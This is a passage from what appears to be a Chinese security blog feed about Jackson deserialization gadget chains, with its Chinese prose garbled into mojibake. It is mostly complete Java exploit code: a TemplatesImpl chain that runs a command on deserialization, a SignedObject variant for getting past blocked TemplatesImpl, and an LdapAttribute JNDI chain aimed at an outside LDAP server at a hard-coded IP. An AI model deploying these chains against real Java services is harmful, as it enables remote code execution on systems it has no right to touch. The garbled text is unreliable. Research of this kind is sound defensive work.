<span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(exp);</span><br><span class="line">        FileOutputStream fout=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">        fout.write(barr.toByteArray());</span><br><span class="line">        fout.close();</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">        System.out.println(serial(exp));</span><br><span class="line">        deserial(serial(exp));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œè¿è¡Œä¼šæŠ¥é”™å› ä¸ºä»€ä¹ˆå‘¢</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735045080749-c31cb363-84a2-4270-916e-6ad2d1792a97.png"></p><p>å¦‚æœåºåˆ—åŒ–çš„ç±»å®ç°äº†<code>writeReplace</code>æ–¹æ³•ï¼Œå°†ä¼šåœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­è°ƒç”¨å®ƒè¿›è¡Œæ£€æŸ¥ï¼Œå¥½å·§ä¸å·§ï¼Œåœ¨<code>POJONode</code>çš„çˆ¶ç±»<code>BaseJsonNode</code>ä¸­å°±å®ç°äº†è¿™ä¸ªæ–¹æ³•ï¼Œåœ¨è¿™ä¸ªæ–¹æ³•çš„è°ƒç”¨è¿‡ç¨‹ä¸­æŠ›å‡ºäº†å¼‚å¸¸ï¼Œä½¿å¾—åºåˆ—åŒ–è¿‡ç¨‹ä¸­æ–­</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ é™¤è¿™ä¸ªæ–¹æ³•æ¥è·³è¿‡è¿™ä¸ªè¿‡ç¨‹ï¼Œè¿›è€ŒæˆåŠŸçš„åºåˆ—åŒ–ã€‚æ‰€ä»¥æˆ‘ä»¬é‡å†™ä»–çš„çˆ¶ç±»åˆ æ‰å°±å¯ä»¥äº†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735045171946-b0b7b646-0ebc-4b0b-b10e-a9d423f19bed.png"></p><p>è¿™æ ·å°±å¯ä»¥æ­£å¸¸è§¦å‘äº†</p><h3 id="SignObjecté“¾"><a href="#SignObjecté“¾" class="headerlink" title="SignObjecté“¾"></a>SignObjecté“¾</h3><p>åœ¨Templatesè¢«bançš„æƒ…å†µä¸‹ æ‰“äºŒæ¬¡ååºåˆ—åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> tongsha;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SignObjectChain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        ctClass.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;,ctClass);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        ctClass.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;fakes0u1&quot;</span>);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templatesImpl);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val2</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val2.set(exp2,jsonNodes2);</span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(exp2,privateKey,signingEngine);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(exp);</span><br><span class="line">        FileOutputStream fout=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">        fout.write(barr.toByteArray());</span><br><span class="line">        fout.close();</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">        System.out.println(serial(exp));</span><br><span class="line">        deserial(serial(exp));</span><br><span class="line">        <span class="comment">//doPOST(exp.toString().getBytes());</span></span><br><span class="line">        <span class="comment">//byte[] byt=new byte[fileInputStream.available()];</span></span><br><span class="line">        <span class="comment">//fileInputStream.read(byt);</span></span><br><span class="line">        <span class="comment">//doPOST(byt);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        <span class="comment">//Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField(&quot;writeReplaceMethod&quot;);</span></span><br><span class="line">        <span class="comment">//writeReplaceMethod.setAccessible(true);</span></span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LdapAttributeé“¾"><a href="#LdapAttributeé“¾" class="headerlink" title="LdapAttributeé“¾"></a>LdapAttributeé“¾</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.ArrayNode;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.BaseJsonNode;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.ValueNode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpHeaders;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.management.JMX;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> javax.naming.CompositeName;</span><br><span class="line"><span class="keyword">import</span> javax.sql.rowset.BaseRowSet;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapAttributeChain</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ldapCtxUrl</span> <span class="operator">=</span> <span class="string">&quot;ldap://114.116.119.253:9999/&quot;</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ldapAttributeClazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ldapAttributeClazzConstructor</span> <span class="operator">=</span> ldapAttributeClazz.getDeclaredConstructor(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;);</span><br><span class="line">        ldapAttributeClazzConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ldapAttribute</span> <span class="operator">=</span> ldapAttributeClazzConstructor.newInstance(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;name&quot;</span>&#125;);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">baseCtxUrlField</span> <span class="operator">=</span> ldapAttributeClazz.getDeclaredField(<span class="string">&quot;baseCtxURL&quot;</span>);</span><br><span class="line">        baseCtxUrlField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">rdnField</span> <span class="operator">=</span> ldapAttributeClazz.getDeclaredField(<span class="string">&quot;rdn&quot;</span>);</span><br><span class="line">        rdnField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        rdnField.set(ldapAttribute, <span class="keyword">new</span> <span class="title class_">CompositeName</span>(<span class="string">&quot;a//b&quot;</span>));</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(ldapAttribute);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line">        deserial(serial(exp));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        <span class="comment">//Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField(&quot;writeReplaceMethod&quot;);</span></span><br><span class="line">        <span class="comment">//writeReplaceMethod.setAccessible(true);</span></span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™æ¡é“¾çš„åˆ†æå‚è€ƒï¼š</p><p><a href="https://stack.chaitin.com/techblog/detail/15">https://stack.chaitin.com/techblog/detail/15</a></p><p><a href="https://y4er.com/posts/real-wolrd-ctf-old-system-new-getter-jndi-gadget/">https://y4er.com/posts/real-wolrd-ctf-old-system-new-getter-jndi-gadget/</a></p><p>å‚è€ƒï¼š</p><p><a href="http://www.mi1k7ea.com/2019/11/17/Jackson%E7%B3%BB%E5%88%97%E4%B8%89%E2%80%94CVE-2017-1748%EF%BC%88%E5%9F%BA%E4%BA%8EClassPathXmlApplicationContext%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/#0x03-%E5%A4%8D%E7%8E%B0%E5%88%A9%E7%94%A8">http://www.mi1k7ea.com/2019/11/17/Jackson%E7%B3%BB%E5%88%97%E4%B8%89%E2%80%94CVE-2017-1748%EF%BC%88%E5%9F%BA%E4%BA%8EClassPathXmlApplicationContext%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/#0x03-%E5%A4%8D%E7%8E%B0%E5%88%A9%E7%94%A8https://boogipop.com/2023/06/20/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/#TemplatesImpl%E9%93%BE</a></p><p><a href="https://xz.aliyun.com/t/12966">https://xz.aliyun.com/t/12966</a></p><p><a href="https://xz.aliyun.com/t/12509">https://xz.aliyun.com/t/12509?</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> Jackson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FastJsonååºåˆ—åŒ–</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
